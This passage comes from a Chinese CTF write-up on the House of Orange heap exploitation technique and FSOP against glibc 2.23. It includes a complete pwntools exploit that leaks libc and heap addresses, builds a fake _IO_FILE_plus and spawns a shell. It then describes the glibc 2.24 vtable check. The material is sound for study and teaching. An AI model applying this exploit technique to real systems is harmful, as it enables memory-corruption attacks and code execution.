function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./houseoforange&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.138&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name :&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange:&quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name:&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange: &quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br></pre></td></tr></table></figure></div>



<p><strong>泄露libc和heap基址</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">def <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function">    global malloc_hook, _IO_list_all, system_addr, heap_base</span></span><br><span class="line"><span class="function">    build(<span class="number">0x30</span>, b<span class="string">&#x27;ffff&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) # chunk0</span></span><br><span class="line"><span class="function">    #debug()</span></span><br><span class="line"><span class="function">    payload =</span> <span class="built_in">cyclic</span>(<span class="number">0x30</span>) + <span class="built_in">p64</span>(<span class="number">0</span>) + <span class="built_in">p64</span>(<span class="number">0x21</span>) + <span class="built_in">p32</span>(<span class="number">233</span>) + <span class="built_in">p32</span>(<span class="number">0xDDAA</span>)</span><br><span class="line">    payload += <span class="built_in">p64</span>(<span class="number">0</span>) * <span class="number">2</span> + <span class="built_in">p64</span>(<span class="number">0xf81</span>)</span><br><span class="line">    <span class="built_in">upgrade</span>(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="meta"># size must be page aligned</span></span><br><span class="line">    <span class="meta">#debug()</span></span><br><span class="line">    <span class="built_in">build</span>(<span class="number">0x1000</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) # chunk1</span><br><span class="line">    <span class="meta">#debug()</span></span><br><span class="line">    <span class="built_in">build</span>(<span class="number">0x400</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">8</span>, <span class="number">666</span>, <span class="number">2</span>) # chunk2</span><br><span class="line">    <span class="built_in">debug</span>()</span><br><span class="line">    io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).<span class="built_in">encode</span>())</span><br><span class="line">    io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc.address = <span class="built_in">u64</span>(io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>\x7f<span class="number">&#x27;</span>).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;libc base address&#x27;</span>, libc.address)</span><br><span class="line">    _IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;_IO_list_all&#x27;</span>, _IO_list_all)</span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;system_addr&#x27;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">upgrade</span>(<span class="number">0x10</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">0x10</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">debug</span>()</span><br><span class="line">    io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).<span class="built_in">encode</span>())</span><br><span class="line">    io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_addr = <span class="built_in">u64</span>(io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>, drop=True).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    heap_base = heap_addr - <span class="number">0xE0</span></span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174459330.png"
                      alt="image-20231019174459330"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174527488.png"
                      alt="image-20231019174527488"
                ></p>
<p>首先通过堆溢出将 <code>top_chunk</code> 的大小改为 <code>0xf81</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174746698.png"
                      alt="image-20231019174746698"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019175547709.png"
                      alt="image-20231019175547709"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019181025042.png"
                      alt="image-20231019181025042"
                ></p>
<p>然后申请一块大于 <code>0xf81</code> 的 <code>chunk</code> 利用上面讲的 <code>sysmalloc</code> 中的 <code>_int_free</code> 函数将 <code>old_top_chunk</code> 放入 <code>unsorted_bin</code> 中。在申请 <code>0x400</code> 大小的 <code>large_chunk</code> ，<code>ptmalloc2</code> 会先将 <code>old_top_chunk</code> 放进 <code>large_bin</code>，然后切分 <code>old_top_chunk</code>，再将其放回 <code>unsorted_bin</code>。 所以此时其 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 遗留了 <code>heap</code> 地址。其 <code>bk</code> 位置遗留了 <code>main_arean+0x668</code> 的地址。我们可以通过 <code>0x400</code> 这个堆块泄露出 <code>heap</code> 和 <code>libc</code> 地址，然后通过计算偏移获得基址。</p>
<p><strong>FSOP</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>():</span><br><span class="line">    orange = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsorted_bin_attack</span></span><br><span class="line">    orange += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    orange = orange.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orange += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">0x400</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += orange</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>)</span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure></div>

<p>我们可以通过 <code>unsorted_bin_attack</code> 将 <code>_IO_list_all</code> 指向 <code>main_arena+0x58</code> ，但这块区域是我们不可控的，我们看一下 <code>malloc_state</code> 结构体源码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line">  <span class="comment">/* int have_fastchunks; glibc 2.23 无此成员 */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><em>(tips:bins[2*N - 2] 和 bins[2 * N - 1]分别对应链表头和链表尾指针)</em></p>
<p><code>bins[11] == small_bin[5] == small_bin_0x60 </code> ，<code>bins[0] == unsorted_bin</code>，相差是 <code>12*8 = 0x60</code>。结合 <code>_IO_FILE_plus</code> 结构体如下图所示:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosa_fake_io.png"
                      alt="hosa_fake_io"
                ></p>
<p>我们可以控制 <code>old_top_chunk</code> 的大小，把它 <code>size</code> 置为 <code>0x61</code>，并在其内部构建 <code>fake_IO_FILE_plus_2</code> 放进 <code>small_bin[5]</code>，那么<code>fp-&gt;_chain</code> 将会指向 <code>fake_IO_FILE_2</code>。此时 <code>main_arena</code> 如下图。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019195436804.png"
                      alt="image-20231019195436804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019200506509.png"
                      alt="image-20231019200506509"
                ></p>
<p>为了绕过如下检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) </span><br><span class="line">    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure></div>

<p>我们构造的 <code>fake_IO_FILE_plus</code> 如下图:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosafioplus.png"
                      alt="hosafioplus"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019200603105.png"
                      alt="image-20231019200603105"
                ></p>
<p>检测到内存错误后的调用 <code>_IO_OVERFLOW (fp, EOF)-&gt;_IO_OVERFLOW(&quot;/bin/sh\x00, EOF&quot;)-&gt;system(&quot;/bin/sh\x00&quot;)</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019201736567.png"
                      alt="image-20231019201736567"
                ></p>
<p><strong>完整exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">lk = <span class="keyword">lambda</span> addrstring, address: log.info(<span class="string">&#x27;&#123;&#125;: %#x&#x27;</span>.<span class="built_in">format</span>(addrstring), address)</span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./houseoforange&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.138&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name :&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange:&quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name:&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange: &quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    <span class="keyword">global</span> malloc_hook, _IO_list_all, system_addr, heap_base</span><br><span class="line">    build(<span class="number">0x30</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># chunk0</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    payload = cyclic(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># size must be page aligned</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    build(<span class="number">0x1000</span>, <span class="string">b&#x27;f&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># chunk1</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    build(<span class="number">0x400</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>, <span class="number">666</span>, <span class="number">2</span>) <span class="comment"># chunk2</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">    lk(<span class="string">&#x27;libc base address&#x27;</span>, libc.address)</span><br><span class="line">    _IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    lk(<span class="string">&#x27;_IO_list_all&#x27;</span>, _IO_list_all)</span><br><span class="line">    lk(<span class="string">&#x27;system_addr&#x27;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">    upgrade(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_addr = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_addr - <span class="number">0xE0</span></span><br><span class="line">    lk(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>():</span><br><span class="line">    orange = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsorted_bin_attack</span></span><br><span class="line">    orange += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># fp-&gt;_mode &lt;= 0;fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</span></span><br><span class="line">    orange = orange.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orange += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">0x400</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += orange</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    connect()</span><br><span class="line">    leak()</span><br><span class="line">    FSOP()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div>

<h1 id="IO-vtable-check-检查及新的利用方法"><a href="#IO-vtable-check-检查及新的利用方法" class="headerlink" title="_IO_vtable_check 检查及新的利用方法"></a>_IO_vtable_check 检查及新的利用方法</h1><h2 id="glibc-2-24-加入的检查"><a href="#glibc-2-24-加入的检查" class="headerlink" title="glibc-2.24 加入的检查"></a>glibc-2.24 加入的检查</h2><p><code>glibc-2.24</code> 后加入了针对 <code>IO_FILE_plus</code> 的 <code>vtable</code> 劫持的检测措施，<code>glibc</code>  会在调用虚函数之前首先检查 <code>vtable</code> 地址的是否合法。首先会验证 <code>vtable</code> 是否位于<code>_IO_vtable</code>  段中，如果满足条件就正常执行，否则会调用 <code>_IO_vtable_check</code> 做进一步检查。如果 <code>vtable</code> 是非法的，那么会引发 <code>abort</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 计算 _IO_vtable 长度</span></span><br><span class="line">    <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">    <span class="comment">// 计算 ptr 与 __start___libc_IO_vtables 距离</span></span><br><span class="line">    <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">    <span class="comment">// 如果即不在 _IO_vtable_段内, 则调用 _IO_vtable_check ()</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">        _IO_vtable_check ();</span><br><span class="line">    <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="built_in">void</span> (*flag) (<span class="type">void</span>) = <span class="built_in">atomic_load_relaxed</span> (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>判断 <code>vtable</code> 的地址是否处于 <code>glibc</code> 中的 <code>vtable</code> 数组段，是的话，通过检查。</li>
<li>否则判断是否为外部的合法 <code>vtable</code>（重构或是动态链接库中的vtable），是的话，通过检查。</li>
<li>否则报错，输出<code>Fatal error: glibc detected an invalid stdio handle</code>，程序退出。</li>
</ol>
